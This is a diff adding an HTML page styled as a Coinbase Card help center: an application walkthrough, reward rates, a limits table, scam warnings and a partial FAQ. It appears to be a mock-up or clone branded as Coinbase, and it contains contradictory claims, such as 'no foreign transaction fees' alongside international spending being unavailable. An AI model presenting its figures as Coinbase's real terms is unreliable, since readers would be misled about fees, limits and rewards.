@@ -1,0 +1,1191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Coinbase Card – Help Center</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+
+  <!-- NAVBAR -->
+  <nav class="navbar">
+    <div class="nav-inner">
+      <a href="index.html" class="logo">
+        <svg width="116" height="24" viewBox="0 0 116 24" fill="none">
+          <circle cx="12" cy="12" r="12" fill="#0052FF"/>
+          <path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/>
+          <text x="28" y="17" font-family="Inter,sans-serif" font-size="16" font-weight="700" fill="#0052FF">coinbase</text>
+        </svg>
+      </a>
+      <div class="nav-links">
+        <a href="index.html" class="nav-link">Help Center</a>
+        <a href="card.html" class="nav-link active">Coinbase Card</a>
+        <a href="scam-alerts.html" class="nav-link">Security</a>
+        <a href="#" class="nav-link">Community</a>
+      </div>
+      <div class="nav-actions">
+        <button class="btn-ghost">Sign In</button>
+        <button class="btn-primary">Get started</button>
+      </div>
+      <button class="hamburger" onclick="toggleMenu()">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+    <div class="mobile-menu" id="mobileMenu">
+      <a href="index.html">Help Center</a>
+      <a href="card.html">Coinbase Card</a>
+      <a href="scam-alerts.html">Security</a>
+    </div>
+  </nav>
+
+  <!-- BREADCRUMB -->
+  <div class="breadcrumb container">
+    <a href="index.html">Help Center</a>
+    <span>›</span>
+    <span>Coinbase Card</span>
+  </div>
+
+  <!-- CARD HERO -->
+  <section class="card-hero">
+    <div class="container card-hero-inner">
+      <div class="card-hero-text">
+        <div class="badge" style="background:#EEF3FF;color:#0052FF">Visa® Debit Card</div>
+        <h1>Your crypto.<br>Anywhere Visa is accepted.</h1>
+        <p>The Coinbase Card lets you spend the crypto in your Coinbase account — in stores, online, and at ATMs — and earn up to <strong>4% back in crypto rewards</strong> on every purchase.</p>
+        <div class="card-hero-actions">
+          <button class="btn-primary btn-lg" onclick="document.getElementById('how-to-apply').scrollIntoView({behavior:'smooth',block:'start'})">How to apply</button>
+          <button class="btn-outline btn-lg" onclick="document.getElementById('faq').scrollIntoView({behavior:'smooth',block:'start'})">Card FAQ</button>
+        </div>
+      </div>
+      <div class="card-showcase">
+        <div class="card-float card-back">
+          <div class="cb-card cb-card-dark" style="transform:rotate(-8deg) translateY(30px) translateX(20px)">
+            <div class="cb-card-logo"><svg width="26" height="26" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#fff" fill-opacity=".2"/><path d="M12 4.8a7.2 7.2 0 100 14.4A7.2 7.2 0 0012 4.8z" fill="#fff"/><circle cx="12" cy="12" r="3.6" fill="#0052FF"/></svg><span>coinbase</span></div>
+            <div class="cb-card-mag"></div>
+          </div>
+        </div>
+        <div class="card-float card-front">
+          <div class="cb-card cb-card-blue" style="transform:rotate(4deg)">
+            <div class="cb-card-logo"><svg width="26" height="26" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#fff" fill-opacity=".2"/><path d="M12 4.8a7.2 7.2 0 100 14.4A7.2 7.2 0 0012 4.8z" fill="#fff"/><circle cx="12" cy="12" r="3.6" fill="#0052FF"/></svg><span>coinbase</span></div>
+            <div class="cb-card-chip"><div class="chip-lines"></div></div>
+            <div class="cb-card-number">•••• •••• •••• 4291</div>
+            <div class="cb-card-bottom">
+              <div><div class="cb-card-label">CARDHOLDER</div><div class="cb-card-value">YOUR NAME</div></div>
+              <div><div class="cb-card-label">EXPIRES</div><div class="cb-card-value">12/28</div></div>
+              <div class="visa-logo">VISA</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- REWARDS SECTION -->
+  <section class="rewards-section container">
+    <h2 class="section-title">Earn crypto every time you spend</h2>
+    <div class="rewards-grid">
+      <div class="reward-card">
+        <div class="reward-icon">₿</div>
+        <h3>4% back in XLM</h3>
+        <p>Earn Stellar Lumens on every purchase when you use XLM as your reward asset</p>
+        <div class="reward-badge">Most Popular</div>
+      </div>
+      <div class="reward-card">
+        <div class="reward-icon">Ξ</div>
+        <h3>2% back in BTC</h3>
+        <p>Earn Bitcoin rewards on all eligible transactions</p>
+      </div>
+      <div class="reward-card">
+        <div class="reward-icon">◎</div>
+        <h3>1% back in ETH</h3>
+        <p>Earn Ethereum rewards on every qualifying spend</p>
+      </div>
+    </div>
+    <p class="rewards-disclaimer">Reward percentages and available assets may change. See current rates in the app. Rewards earned in crypto, not USD.</p>
+  </section>
+
+  <!-- HOW TO APPLY – INTERACTIVE FLOW -->
+  <section class="apply-flow" id="how-to-apply">
+    <div class="container">
+      <div class="apply-header">
+        <h2 class="section-title" style="margin-bottom:8px">How to apply for the Coinbase Card</h2>
+        <p class="section-sub" style="margin-bottom:40px">Follow these steps in the Coinbase app — takes about 3 minutes</p>
+      </div>
+
+      <!-- PROGRESS TRACK -->
+      <div class="apply-progress">
+        <div class="ap-track">
+          <div class="ap-fill" id="apFill"></div>
+        </div>
+        <div class="ap-dots">
+          <button class="ap-dot active" data-step="0" onclick="goStep(0)"><span>1</span><label>Verify</label></button>
+          <button class="ap-dot" data-step="1" onclick="goStep(1)"><span>2</span><label>Open App</label></button>
+          <button class="ap-dot" data-step="2" onclick="goStep(2)"><span>3</span><label>Rewards</label></button>
+          <button class="ap-dot" data-step="3" onclick="goStep(3)"><span>4</span><label>Apply</label></button>
+          <button class="ap-dot" data-step="4" onclick="goStep(4)"><span>5</span><label>Activate</label></button>
+          <button class="ap-dot" data-step="5" onclick="goStep(5)"><span>6</span><label>Spend</label></button>
+        </div>
+      </div>
+
+      <!-- STEP PANELS -->
+      <div class="apply-panels">
+
+        <!-- Step 1 -->
+        <div class="apply-panel active" data-panel="0">
+          <div class="ap-content">
+            <div class="ap-text">
+              <div class="ap-step-label">Step 1 of 6</div>
+              <h3>Verify your Coinbase account</h3>
+              <p>Before you can apply, your Coinbase account must pass identity verification. This is required by federal law and takes 2–5 minutes.</p>
+              <div class="ap-checklist">
+                <div class="ap-check-item">
+                  <span class="ap-check">✓</span>
+                  <div>
+                    <strong>Government-issued photo ID</strong>
+                    <span>Passport, driver's license, or state ID</span>
+                  </div>
+                </div>
+                <div class="ap-check-item">
+                  <span class="ap-check">✓</span>
+                  <div>
+                    <strong>Selfie verification</strong>
+                    <span>A quick face scan to confirm your identity</span>
+                  </div>
+                </div>
+                <div class="ap-check-item">
+                  <span class="ap-check">✓</span>
+                  <div>
+                    <strong>US resident</strong>
+                    <span>Card available in most states — check the app for your state</span>
+                  </div>
+                </div>
+              </div>
+              <div class="ap-verify-actions">
+                <button class="btn-primary btn-verify-start" onclick="openVerifyModal()">
+                  <span class="bvs-icon">🪪</span>
+                  Start Identity Verification
+                </button>
+                <p class="ap-verify-sub">Takes 2–5 minutes &nbsp;·&nbsp; No credit check &nbsp;·&nbsp; 100% secure</p>
+              </div>
+              <div class="ap-note ap-note-info">
+                <span>ℹ️</span>
+                <span>Already verified? Skip straight to Step 2. Go to <strong>Settings → Identity verification</strong> to check your status.</span>
+              </div>
+            </div>
+            <div class="ap-phone">
+              <div class="ap-phone-frame">
+                <div class="ap-phone-bar">Settings</div>
+                <div class="ap-phone-body">
+                  <div class="ap-menu-item ap-menu-active">
+                    <span>🪪</span><span>Identity verification</span><span class="ap-check-green">✓ Verified</span>
+                  </div>
+                  <div class="ap-menu-item">
+                    <span>🔐</span><span>2-step verification</span><span class="ap-chevron">›</span>
+                  </div>
+                  <div class="ap-menu-item">
+                    <span>📱</span><span>Trusted devices</span><span class="ap-chevron">›</span>
+                  </div>
+                  <div class="ap-menu-item">
+                    <span>🔔</span><span>Notifications</span><span class="ap-chevron">›</span>
+                  </div>
+                  <div class="ap-verify-badge">
+                    <div class="ap-vb-icon">✓</div>
+                    <div>
+                      <div class="ap-vb-title">Identity Verified</div>
+                      <div class="ap-vb-sub">Your account is fully verified</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="ap-nav">
+            <span></span>
+            <button class="btn-primary" onclick="goStep(1)">Next: Open the App →</button>
+          </div>
+        </div>
+
+        <!-- Step 2 -->
+        <div class="apply-panel" data-panel="1">
+          <div class="ap-content">
+            <div class="ap-text">
+              <div class="ap-step-label">Step 2 of 6</div>
+              <h3>Open the Coinbase app</h3>
+              <p>Tap the <strong>Card</strong> tab at the bottom of the Coinbase app. It looks like a credit card icon in the navigation bar.</p>
+              <div class="ap-tip-box">
+                <div class="ap-tip-icon">💡</div>
+                <div>
+                  <strong>Don't see the Card tab?</strong>
+                  <p>Update your Coinbase app to the latest version. Go to the App Store or Google Play and tap Update.</p>
+                </div>
+              </div>
+              <div class="ap-tip-box ap-tip-warn">
+                <div class="ap-tip-icon">⚠️</div>
+                <div>
+                  <strong>Only use the official Coinbase app</strong>
+                  <p>Search "Coinbase" on the App Store or Google Play. The publisher must be <em>Coinbase, Inc.</em> Fake apps can steal your funds.</p>
+                </div>
+              </div>
+            </div>
+            <div class="ap-phone">
+              <div class="ap-phone-frame">
+                <div class="ap-phone-bar">Coinbase</div>
+                <div class="ap-phone-body ap-home">
+                  <div class="ap-home-bal">
+                    <div class="ap-bal-label">Portfolio value</div>
+                    <div class="ap-bal-val">$3,841.20</div>
+                  </div>
+                  <div class="ap-home-assets">
+                    <div class="ap-asset"><span class="ap-asset-dot" style="background:#F7931A"></span><span>BTC</span><span>$2,100.00</span></div>
+                    <div class="ap-asset"><span class="ap-asset-dot" style="background:#627EEA"></span><span>ETH</span><span>$941.20</span></div>
+                    <div class="ap-asset"><span class="ap-asset-dot" style="background:#2775CA"></span><span>USDC</span><span>$800.00</span></div>
+                  </div>
+                </div>
+                <div class="ap-phone-tabs">
+                  <div class="ap-tab">🏠<span>Home</span></div>
+                  <div class="ap-tab">📈<span>Trade</span></div>
+                  <div class="ap-tab ap-tab-active">💳<span>Card</span></div>
+                  <div class="ap-tab">👤<span>Profile</span></div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="ap-nav">
+            <button class="btn-ghost" onclick="goStep(0)">← Back</button>
+            <button class="btn-primary" onclick="goStep(2)">Next: Choose Rewards →</button>
+          </div>
+        </div>
+
+        <!-- Step 3 -->
+        <div class="apply-panel" data-panel="2">
+          <div class="ap-content">
+            <div class="ap-text">
+              <div class="ap-step-label">Step 3 of 6</div>
+              <h3>Choose your crypto rewards</h3>
+              <p>Pick which crypto you want to earn back on every purchase. You can change this anytime — for free — directly in the app.</p>
+              <div class="ap-rewards-pick">
+                <div class="ap-reward-opt ap-reward-selected" onclick="selectReward(this,'XLM')">
+                  <span class="ap-r-icon" style="background:#1A1A2E;color:#fff">✦</span>
+                  <div>
+                    <strong>4% back in XLM</strong>
+                    <span>Stellar Lumens · Most popular</span>
+                  </div>
+                  <span class="ap-r-check">✓</span>
+                </div>
+                <div class="ap-reward-opt" onclick="selectReward(this,'BTC')">
+                  <span class="ap-r-icon" style="background:#FFF3E0;color:#F7931A">₿</span>
+                  <div>
+                    <strong>2% back in BTC</strong>
+                    <span>Bitcoin</span>
+                  </div>
+                  <span class="ap-r-check" style="opacity:0">✓</span>
+                </div>
+                <div class="ap-reward-opt" onclick="selectReward(this,'ETH')">
+                  <span class="ap-r-icon" style="background:#EEF0FF;color:#627EEA">Ξ</span>
+                  <div>
+                    <strong>1% back in ETH</strong>
+                    <span>Ethereum</span>
+                  </div>
+                  <span class="ap-r-check" style="opacity:0">✓</span>
+                </div>
+              </div>
+              <div class="ap-note ap-note-info">
+                <span>ℹ️</span>
+                <span>Rewards are deposited directly into your Coinbase account after each statement period. No points, no conversions — real crypto.</span>
+              </div>
+            </div>
+            <div class="ap-phone">
+              <div class="ap-phone-frame">
+                <div class="ap-phone-bar">Choose Reward</div>
+                <div class="ap-phone-body">
+                  <div class="ap-rwd-title">Which crypto do you want to earn?</div>
+                  <div class="ap-rwd-opt ap-rwd-sel">
+                    <span>✦</span>
+                    <div><div class="ap-rwd-name">Stellar Lumens (XLM)</div><div class="ap-rwd-pct">4% back</div></div>
+                    <span class="ap-rwd-dot"></span>
+                  </div>
+                  <div class="ap-rwd-opt">
+                    <span style="color:#F7931A">₿</span>
+                    <div><div class="ap-rwd-name">Bitcoin (BTC)</div><div class="ap-rwd-pct">2% back</div></div>
+                  </div>
+                  <div class="ap-rwd-opt">
+                    <span style="color:#627EEA">Ξ</span>
+                    <div><div class="ap-rwd-name">Ethereum (ETH)</div><div class="ap-rwd-pct">1% back</div></div>
+                  </div>
+                  <div class="ap-rwd-cta">Select &amp; Continue</div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="ap-nav">
+            <button class="btn-ghost" onclick="goStep(1)">← Back</button>
+            <button class="btn-primary" onclick="goStep(3)">Next: Submit Application →</button>
+          </div>
+        </div>
+
+        <!-- Step 4 -->
+        <div class="apply-panel" data-panel="3">
+          <div class="ap-content">
+            <div class="ap-text">
+              <div class="ap-step-label">Step 4 of 6</div>
+              <h3>Submit your application</h3>
+              <p>Confirm your personal information and shipping address. Most applications are reviewed <strong>instantly</strong>.</p>
+              <div class="ap-form-preview">
+                <div class="ap-field">
+                  <label>Full legal name</label>
+                  <div class="ap-field-val">As shown on your ID</div>
+                </div>
+                <div class="ap-field">
+                  <label>Date of birth</label>
+                  <div class="ap-field-val">Must be 18+</div>
+                </div>
+                <div class="ap-field">
+                  <label>Shipping address</label>
+                  <div class="ap-field-val">US addresses only</div>
+                </div>
+                <div class="ap-field">
+                  <label>SSN (last 4 digits)</label>
+                  <div class="ap-field-val">Required for card issuance</div>
+                </div>
+              </div>
+              <div class="ap-note ap-note-danger">
+                <span>🚨</span>
+                <div>
+                  <strong>Scam warning:</strong> Coinbase will <em>never</em> charge a fee to apply for or activate your card. Anyone asking for payment is a scammer — report them immediately via the app.
+                </div>
+              </div>
+            </div>
+            <div class="ap-phone">
+              <div class="ap-phone-frame">
+                <div class="ap-phone-bar">Apply for Card</div>
+                <div class="ap-phone-body">
+                  <div class="ap-form-field"><div class="ap-ff-label">Full name</div><div class="ap-ff-input">John Doe</div></div>
+                  <div class="ap-form-field"><div class="ap-ff-label">Date of birth</div><div class="ap-ff-input">01 / 15 / 1990</div></div>
+                  <div class="ap-form-field"><div class="ap-ff-label">Shipping address</div><div class="ap-ff-input">123 Main St, CA 94107</div></div>
+                  <div class="ap-form-field"><div class="ap-ff-label">SSN last 4</div><div class="ap-ff-input">••••</div></div>
+                  <div class="ap-submit-btn">Submit Application — Free</div>
+                  <div class="ap-form-note">No fees. No credit check.</div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="ap-nav">
+            <button class="btn-ghost" onclick="goStep(2)">← Back</button>
+            <button class="btn-primary" onclick="goStep(4)">Next: Receive &amp; Activate →</button>
+          </div>
+        </div>
+
+        <!-- Step 5 -->
+        <div class="apply-panel" data-panel="4">
+          <div class="ap-content">
+            <div class="ap-text">
+              <div class="ap-step-label">Step 5 of 6</div>
+              <h3>Receive &amp; activate your card</h3>
+              <p>Your physical card ships via USPS and arrives in <strong>7–10 business days</strong>. While you wait, your virtual card is ready to use immediately.</p>
+              <div class="ap-timeline">
+                <div class="ap-tl-item ap-tl-done">
+                  <div class="ap-tl-dot">✓</div>
+                  <div>
+                    <strong>Approved</strong>
+                    <span>Instant decision in most cases</span>
+                  </div>
+                </div>
+                <div class="ap-tl-line"></div>
+                <div class="ap-tl-item ap-tl-done">
+                  <div class="ap-tl-dot">✓</div>
+                  <div>
+                    <strong>Virtual card ready</strong>
+                    <span>Use online &amp; in Apple/Google Pay now</span>
+                  </div>
+                </div>
+                <div class="ap-tl-line"></div>
+                <div class="ap-tl-item ap-tl-active">
+                  <div class="ap-tl-dot ap-tl-pulse">→</div>
+                  <div>
+                    <strong>Physical card ships</strong>
+                    <span>Arrives in 7–10 business days</span>
+                  </div>
+                </div>
+                <div class="ap-tl-line ap-tl-dashed"></div>
+                <div class="ap-tl-item ap-tl-pending">
+                  <div class="ap-tl-dot ap-tl-empty"></div>
+                  <div>
+                    <strong>Activate in the app</strong>
+                    <span>Card → Activate card → Enter last 4 digits</span>
+                  </div>
+                </div>
+              </div>
+              <div class="ap-note ap-note-warn">
+                <span>⚠️</span>
+                <span>Only activate your card through the <strong>official Coinbase app</strong>. Do not click activation links from emails or texts you didn't request.</span>
+              </div>
+            </div>
+            <div class="ap-phone">
+              <div class="ap-phone-frame">
+                <div class="ap-phone-bar">Activate Card</div>
+                <div class="ap-phone-body ap-activate">
+                  <div class="ap-act-card">
+                    <div class="ap-act-card-inner">
+                      <span>coinbase</span>
+                      <span class="ap-act-visa">VISA</span>
+                    </div>
+                  </div>
+                  <div class="ap-act-title">Card on its way!</div>
+                  <div class="ap-act-sub">Expected: 7–10 business days</div>
+                  <div class="ap-act-input-wrap">
+                    <div class="ap-act-label">Enter last 4 digits when it arrives</div>
+                    <div class="ap-act-inputs">
+                      <div class="ap-act-box">•</div>
+                      <div class="ap-act-box">•</div>
+                      <div class="ap-act-box">•</div>
+                      <div class="ap-act-box ap-act-box-focus">_</div>
+                    </div>
+                  </div>
+                  <div class="ap-act-btn">Activate Card</div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="ap-nav">
+            <button class="btn-ghost" onclick="goStep(3)">← Back</button>
+            <button class="btn-primary" onclick="goStep(5)">Next: Start Spending →</button>
+          </div>
+        </div>
+
+        <!-- Step 6 -->
+        <div class="apply-panel" data-panel="5">
+          <div class="ap-content ap-content-center">
+            <div class="ap-success">
+              <div class="ap-success-icon">🎉</div>
+              <h3>You're all set — start spending &amp; earning!</h3>
+              <p>Use your Coinbase Card anywhere Visa is accepted. Your crypto is automatically sold at purchase time and rewards are deposited each period.</p>
+              <div class="ap-done-grid">
+                <div class="ap-done-item">
+                  <span>🛒</span>
+                  <strong>Swipe in stores</strong>
+                  <span>Use your physical or virtual card at checkout</span>
+                </div>
+                <div class="ap-done-item">
+                  <span>📱</span>
+                  <strong>Tap to pay</strong>
+                  <span>Apple Pay &amp; Google Pay supported</span>
+                </div>
+                <div class="ap-done-item">
+                  <span>🌐</span>
+                  <strong>Shop online</strong>
+                  <span>Enter card details on any checkout page</span>
+                </div>
+                <div class="ap-done-item">
+                  <span>💰</span>
+                  <strong>Earn crypto rewards</strong>
+                  <span>Deposited automatically after each period</span>
+                </div>
+                <div class="ap-done-item">
+                  <span>🏧</span>
+                  <strong>ATM withdrawals</strong>
+                  <span>Up to $1,000/day (ATM fees may apply)</span>
+                </div>
+                <div class="ap-done-item">
+                  <span>❄️</span>
+                  <strong>Freeze instantly</strong>
+                  <span>Lock your card in the app with one tap</span>
+                </div>
+              </div>
+              <button class="btn-primary btn-lg" style="margin-top:32px" onclick="goStep(0)">Start over ↺</button>
+            </div>
+          </div>
+        </div>
+
+      </div><!-- end apply-panels -->
+    </div>
+  </section>
+
+  <!-- VIRTUAL CARD SECTION -->
+  <section class="virtual-card-section">
+    <div class="container virtual-inner">
+      <div>
+        <h2>Use it before it arrives</h2>
+        <p>Once approved, you get access to a <strong>virtual card</strong> instantly — use it for online purchases, Apple Pay, and Google Pay while your physical card ships.</p>
+        <ul class="virtual-list">
+          <li>✓ Available in Apple Wallet &amp; Google Wallet</li>
+          <li>✓ Tap-to-pay in supported stores</li>
+          <li>✓ Use online immediately</li>
+          <li>✓ Full card details available in the app</li>
+        </ul>
+      </div>
+      <div class="phone-mock">
+        <div class="phone-screen">
+          <div class="phone-header">Coinbase Card</div>
+          <div class="phone-balance">$1,247.83</div>
+          <div class="phone-mini-card">
+            <div class="pmc-top"><span>coinbase</span><span>VISA</span></div>
+            <div class="pmc-num">•••• 4291</div>
+          </div>
+          <div class="phone-actions">
+            <div class="pa">💳 Tap to Pay</div>
+            <div class="pa">🔒 Freeze</div>
+            <div class="pa">⚙️ Settings</div>
+          </div>
+          <div class="phone-txns">
+            <div class="txn"><span>☕ Coffee Shop</span><span class="red">-$5.40</span></div>
+            <div class="txn"><span>🛒 Grocery Store</span><span class="red">-$82.13</span></div>
+            <div class="txn"><span>₿ BTC Reward</span><span class="green">+$1.67</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- CARD FEATURES TABLE -->
+  <section class="features-table container">
+    <h2 class="section-title">Card details at a glance</h2>
+    <div class="table-wrap">
+      <table class="cb-table">
+        <tbody>
+          <tr><td>Card Type</td><td>Visa® Debit Card (physical + virtual)</td></tr>
+          <tr><td>Annual Fee</td><td>$0 — No fees, ever</td></tr>
+          <tr><td>Rewards</td><td>Up to 4% back in crypto</td></tr>
+          <tr><td>ATM Withdrawals</td><td>Up to $1,000 per day (fees may apply at ATM)</td></tr>
+          <tr><td>Daily Spending Limit</td><td>Up to $10,000 per day</td></tr>
+          <tr><td>Accepted</td><td>Everywhere Visa is accepted in the US</td></tr>
+          <tr><td>Supported Assets</td><td>BTC, ETH, USDC, and more</td></tr>
+          <tr><td>Contactless / NFC</td><td>Yes — Apple Pay &amp; Google Pay</td></tr>
+          <tr><td>Issuing Bank</td><td>Pathward, N.A., Member FDIC</td></tr>
+          <tr><td>Availability</td><td>US residents only (most states)</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- SCAM WARNING SECTION -->
+  <section class="scam-warn-section container">
+    <div class="scam-warn-card">
+      <div class="scam-warn-icon">🚨</div>
+      <div>
+        <h3>Protect yourself from Coinbase Card scams</h3>
+        <ul class="scam-list">
+          <li><strong>Never pay to get your card.</strong> Coinbase Card is free. Any message asking for a fee to unlock or ship your card is fraudulent.</li>
+          <li><strong>Never share your card number with Coinbase "support."</strong> Real Coinbase support never needs your full card number or CVV.</li>
+          <li><strong>Ignore social media DMs.</strong> Coinbase does not offer card support through Twitter/X, Instagram, or Telegram.</li>
+          <li><strong>Only activate through the official app.</strong> Do not follow activation links sent via email or text that you did not initiate.</li>
+        </ul>
+        <a href="scam-alerts.html" class="btn-outline" style="display:inline-block;margin-top:16px;text-decoration:none">View all security tips →</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- FAQ — TABBED & RICH -->
+  <section class="faq-section container" id="faq">
+    <h2 class="section-title">Card FAQ</h2>
+    <p class="section-sub">Everything you need to know about the Coinbase Card</p>
+
+    <!-- CATEGORY TABS -->
+    <div class="faq-tabs">
+      <button class="faq-tab active" onclick="switchFaqTab(this,'general')">General</button>
+      <button class="faq-tab" onclick="switchFaqTab(this,'rewards')">Rewards</button>
+      <button class="faq-tab" onclick="switchFaqTab(this,'spending')">Spending &amp; Limits</button>
+      <button class="faq-tab" onclick="switchFaqTab(this,'manage')">Managing Your Card</button>
+      <button class="faq-tab" onclick="switchFaqTab(this,'security')">Security &amp; Scams</button>
+      <button class="faq-tab" onclick="switchFaqTab(this,'taxes')">Taxes</button>
+    </div>
+
+    <!-- GENERAL -->
+    <div class="faq-group active" id="faq-general">
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Eligibility</span><span>Is the Coinbase Card free?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>Yes — completely free. There are <strong>no application fees, no annual fees, no monthly fees</strong>, and no foreign transaction fees. Some third-party ATM operators charge their own withdrawal fees, but Coinbase does not add any fee on top of those.</p>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Eligibility</span><span>Who can get the Coinbase Card?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>You must be:</p>
+          <ul class="faq-ul">
+            <li>A US resident (18 years or older)</li>
+            <li>A verified Coinbase account holder (identity verification completed)</li>
+            <li>Located in an eligible state — check the app for your state's status</li>
+          </ul>
+          <div class="faq-callout faq-callout-info">No credit check is performed. Your credit score is not affected by applying.</div>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Application</span><span>How long does approval take?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>Most applications are reviewed <strong>instantly</strong>. In some cases, additional review may take up to 3–5 business days. You'll receive a notification in the app when a decision is made.</p>
+          <p style="margin-top:8px">Once approved, your virtual card is available immediately while your physical card ships in 7–10 business days.</p>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Application</span><span>Is a credit check required?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p><strong>No.</strong> The Coinbase Card is a debit card linked to your Coinbase account balance — not a line of credit. No credit check is run, and your credit score is not impacted in any way.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- REWARDS -->
+    <div class="faq-group" id="faq-rewards">
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Rewards</span><span>How do crypto rewards work?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>Every time you make an eligible purchase with your Coinbase Card, you earn a percentage of that purchase back as crypto. The reward is calculated based on the USD amount spent and credited as crypto at the market rate at time of reward issuance.</p>
+          <div class="faq-rewards-table">
+            <div class="frt-row frt-header"><span>Asset</span><span>Rate</span><span>Deposited to</span></div>
+            <div class="frt-row"><span>XLM (Stellar)</span><span class="frt-pct frt-pct-high">4%</span><span>Your Coinbase wallet</span></div>
+            <div class="frt-row"><span>BTC (Bitcoin)</span><span class="frt-pct frt-pct-med">2%</span><span>Your Coinbase wallet</span></div>
+            <div class="frt-row"><span>ETH (Ethereum)</span><span class="frt-pct frt-pct-low">1%</span><span>Your Coinbase wallet</span></div>
+          </div>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Rewards</span><span>When are rewards deposited?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>Rewards are typically deposited to your Coinbase account within a few days after each eligible purchase. You can view your reward history under <strong>Card → Rewards</strong> in the app.</p>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Rewards</span><span>Can I change my rewards asset?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>Yes — and it's free. Go to <strong>Card → Rewards → Change reward</strong> in the app. Changes take effect on your next eligible purchase. There's no limit to how often you can change it.</p>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Rewards</span><span>Which purchases don't earn rewards?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>The following transactions typically do <strong>not</strong> earn rewards:</p>
+          <ul class="faq-ul">
+            <li>ATM withdrawals</li>
+            <li>Cash advances</li>
+            <li>Peer-to-peer transactions (e.g. Venmo, PayPal)</li>
+            <li>Gift card purchases at certain retailers</li>
+            <li>Purchases later returned or reversed</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- SPENDING -->
+    <div class="faq-group" id="faq-spending">
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Spending</span><span>How does crypto get converted when I pay?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>At the moment of purchase, Coinbase automatically sells crypto from your selected spending wallet at the <strong>current market rate</strong> and pays the merchant in USD. You never need to manually convert before spending.</p>
+          <div class="faq-callout faq-callout-warn">Each conversion is a taxable event in the US. See the Taxes tab for more information.</div>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Limits</span><span>What are the spending and ATM limits?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <div class="faq-limits-grid">
+            <div class="faq-limit-row"><span>Daily spend limit</span><strong>$10,000</strong></div>
+            <div class="faq-limit-row"><span>Per-transaction limit</span><strong>$10,000</strong></div>
+            <div class="faq-limit-row"><span>ATM daily limit</span><strong>$1,000</strong></div>
+            <div class="faq-limit-row"><span>International spend</span><strong>Not available</strong></div>
+          </div>
+          <p style="font-size:13px;color:var(--text-muted);margin-top:10px">Limits are subject to change. Your available balance also acts as a limit — you can only spend what's in your account.</p>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Spending</span><span>Which crypto can I spend?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>You can set any supported crypto in your Coinbase account as your spending asset. Commonly used assets include:</p>
+          <ul class="faq-ul">
+            <li>Bitcoin (BTC)</li>
+            <li>Ethereum (ETH)</li>
+            <li>USD Coin (USDC)</li>
+            <li>Stellar (XLM), and more</li>
+          </ul>
+          <p style="margin-top:8px">USDC is a popular choice since it's a stablecoin pegged to USD, reducing the impact of price swings at time of purchase.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- MANAGE -->
+    <div class="faq-group" id="faq-manage">
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
